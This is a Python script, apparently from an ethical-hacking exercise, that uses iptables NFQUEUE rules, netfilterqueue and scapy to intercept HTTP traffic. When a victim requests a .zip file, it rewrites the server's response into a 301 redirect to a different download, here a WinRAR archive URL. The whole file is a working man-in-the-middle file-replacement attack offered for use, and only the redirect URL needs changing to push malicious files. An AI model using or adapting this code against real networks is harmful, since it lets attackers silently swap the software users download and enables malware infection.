import netfilterqueue
import scapy.all as sp
import optparse
import subprocess

ack_list = []

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue", dest="queue", help="Enter the queue no. which you want to create and send packet to.")
    (options, arguments) = parser.parse_args()

    if not options.queue:
        parser.error("Please input queue number, use --help for more info.")
    return options

def set_load(pkt,load):
    pkt[sp.Raw].load = load
    del pkt[sp.IP].len
    del pkt[sp.IP].chksum
    del pkt[sp.TCP].chksum

    return pkt

def process_packet(packet):

    scapy_packet  = sp.IP(packet.get_payload())
    if scapy_packet.haslayer(sp.Raw):
        if scapy_packet[sp.TCP].dport == 80:
            if ".zip" in scapy_packet[sp.Raw].load.decode():
                print("[+] zip Request")
                ack_list.append(scapy_packet[sp.TCP].ack)

        elif scapy_packet[sp.TCP].sport == 80:
            if scapy_packet[sp.TCP].seq in ack_list:
                print("[+] Replacing File..")
                ack_list.remove(scapy_packet[sp.TCP].seq)
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\r\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-701.tar.gz\r\n")
                packet.set_payload(bytes(modified_packet))

    packet.accept()


def queue_creation(queue_no):

    subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_no])

def flush(queue_no):

    subprocess.call(['iptables', '-D', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-D', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_no])


options = get_arguments()

try:
    queue_creation(options.queue)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue), process_packet)
    queue.run()

except KeyboardInterrupt:
    print("[-] Detected CTRL + C .... Flushing queue...")
    flush(options.queue)
    flush(options.queue)

